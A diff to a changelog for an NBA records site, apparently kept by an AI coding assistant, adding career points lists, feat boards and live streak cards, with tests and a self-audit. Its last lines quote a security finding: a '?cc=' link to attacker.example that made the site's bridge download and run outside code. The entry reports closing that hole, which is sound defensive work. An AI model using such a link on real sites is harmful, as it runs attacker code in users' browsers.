@@ -2,6 +2,91 @@
 
 Each entry: what changed, how it was tested, and what is still unproven.
 
+## 0.142.0 (2026-11-21): all-time points to the top 100, career feat boards and live streaks (bridge v29)
+
+The user, 11/21: "proceed with your suggestions", with 15 screenshots of Basketball-Reference career game-finder boards (the feats I listed plus their own), and "consider other combination feats worth tracking with active players close to reaching the top". The bridge changes are on that go.
+
+**The screenshots' date.** Basketball-Reference hadn't added the 11/20 games when they were taken. Harden's 40 points on 11/20 is missing (his last 40-point game reads 2025-26), and on the career points list every player who played 11/20 is short by exactly that game. Everyone else matches. So both sets are counts through 11/19, and our box scores add everything after.
+
+**(1) All-time points.**
+- The list now runs to about 120th, using:
+  - The NBA Guide's 68 career scorers.
+  - Retired players from the user's ranks 69-118 (`src/data/nba-career-points-deep-2026-11-21.json`). Their totals no longer change.
+  - Every active player's points through 2025-26 from the Guide's year-by-year pages.
+- The list is complete above 16,658.
+- Rule (`src/records/notable.js`, and the same in the bridge):
+  - A live card for a place in the top 50.
+  - A live card for entering the top 100, 75, 50 or 25 from below. Only the crossing pass is tagged, e.g. "Booker: 89 points from passing Zach Randolph (18,578) for 75th all-time, into the top 75".
+  - A pass to 51st-100th otherwise is `siteOnly`: on the Records page and the Watch List storylines, never an NBA Live card (pre-game or live).
+- Retired ranks match the screenshot except where the Guide's own figure differs. Dolph Schayes: the Guide 19,247, Basketball-Reference 18,438. The Guide wins (NBA first), which moves the names between 64th and 76th down one.
+- The career-seasons file also carries team totals under capitalized nicknames ("NUGGETS 409,322"). They were briefly ranked 1st-29th in a local build, and are filtered out.
+
+**(2) Career feat boards** (`src/data/feat-boards-2026-11-21.json`, 12 boards):
+- The boards:
+  - 30-10-5
+  - 25-10-5
+  - 30 points + 10 rebounds
+  - 30 points + 10 assists
+  - 40-point games
+  - 30-point triple-doubles
+  - 35 points + 5 threes
+  - 5-block games
+  - 5 blocks + 5 threes
+  - 3 steals + 3 blocks + 3 threes
+  - 10-10 with single-digit points
+  - 15-15-15
+- How a count is built: the screenshot's count plus the player's qualifying games since 11/19, matched by name to this season's players. `src/records/featboards.js` writes `docs/data/featlive.json`.
+- A consistency check: a player whose "last such game" season disagrees with our box scores is a build warning. None today.
+- Live (bridge `featChecks`; the rules are `src/records/featlive.js`, compiled in as FEAT_RULES):
+  - A card when tonight's line qualifies and moves him: passes or ties a name, or adds to a record he holds.
+  - "On the verge" from the 3rd quarter when one stat is a step short (5 points, 2 rebounds or assists, 1 three, steal or block).
+  - The ceiling board (single-digit points) waits for the last five minutes, "as it stands", and is greyed if he scores again.
+  - The card's back is the list's top 5 with him.
+  - Others on the list who do it tonight count live.
+  - A count that already holds tonight's game is taken back first.
+- Pre-game: the site's storylines get "his next 30-10-5 game would be his 136th, passing…" only when the next one moves him, with how often he's done it this season. Tonight that's Wembanyama's next 5-block game passing Josh Smith and Rudy Gobert.
+- The blocks board carries Basketball-Reference's pre-1973-74 researched games (Wilt Chamberlain's 126). That's said on its card.
+
+**(3) Live streaks** (bridge `streakChecks`):
+- **Player runs:**
+  - Runs the teams' notes name that our box scores confirm: Towns's double-doubles (15) and Garland's 5+ assists (13).
+  - Curry's made-three run: 102, 7th on the list since 1967-68. He hasn't played since 11/11.
+  - Each gets "extended" the moment the line meets it (with its place on the list, for Curry), "in danger" in the last six minutes saying what's missing, and "ends" at the final with his line.
+- **Team runs from the notes** (`teamStreakOf`): wins over one opponent (DAL's 11 straight at home over Utah), 100+ points against one opponent (MIN's 31 against Houston), and wins when holding a team to N or fewer.
+  - Each is carried on from the date its count is as of.
+  - MIN's "33 straight when holding opponents to 105 or fewer" ended 11/19 (99-102 to the Knicks), so it isn't followed. The build log says so.
+- A night the file already counts gets no streak cards.
+
+**Tests.** 1,135, 14 new:
+- Points rules (live 50, site 100, tiers, crossing pass only) on a synthetic list crossing the top 100.
+- The feat rules and the build's counts over a screenshot.
+- Notes and team run parsing.
+- Bridge v29 in a stand-in NBA Live:
+  - a pass card, a record card, on the verge, the ceiling board as it stands then greyed
+  - a list run extended, notes runs in danger then extended or ended
+  - team runs extended and in danger
+  - no streak cards on a counted night
+- The compiled-in rules equal their sources, and the data contract covers `featlive.json`.
+- Full local build, bridge lint (no new undefined names), articles 98.
+
+**Other feats checked** (our box scores since 1993-94; only a screenshot can make them all-time):
+- 50-point games: Dončić 11, two this season.
+- 20-point triple-doubles: Jokić 156 since 1993-94. Oscar Robertson's all-time count is unknown here.
+- 40-point triple-doubles: Harden 16, Westbrook 12, Dončić 10, Jokić 8.
+- 40 points + 5 threes: Curry 73 vs Harden 72 for 1st.
+- 30 points + 5 threes + 5 assists: Dončić 97, ten this season.
+- 30 points + 5 blocks: Wembanyama 17, four this season.
+- 40-10, 20-20.
+- Triple-doubles with no turnovers: Jokić 8.
+- 6-steal games: Dyson Daniels.
+
+**Self-audit.**
+- The career-seasons team rows would have put 29 franchises at the top of the points list. It was caught in the first local build, by looking at the board rather than trusting the count of matched players.
+- The screenshots looked current, but a check against our box scores showed they stopped at 11/19. Treating them as through 11/20 would have double-counted every 11/20 game.
+- The feat boards end where each screenshot ends. A player below a board's last visible row can't be placed, so no card says he "joins" a list.
+- The notes' team counts aren't checked against earlier seasons (our box scores are this season only). The cards say "the notes' count".
+- Not yet seen live: v29's cards fire from tonight.
+
 ## 0.141.18 (2026-11-21): the bridge refuses outside addresses and runs no downloaded code (bridge v28)
 
 The user pasted NBA Live's security check (11/21): "cc-bridge.js still takes ?cc= from the page address with no restriction, and it downloads oddlines.js and linerare.js from beside that address and runs them with new Function. A link like ?cc=https://attacker.example/watch.json ran outside code inside NBA Live (tested on v27: 11 files fetched, both rules files ran)." They asked for (1) ?cc= only when off, under the site, or a relative .json path, (2) no downloaded files run as code, and (3) branch protection on main with a way around it for the data bot.
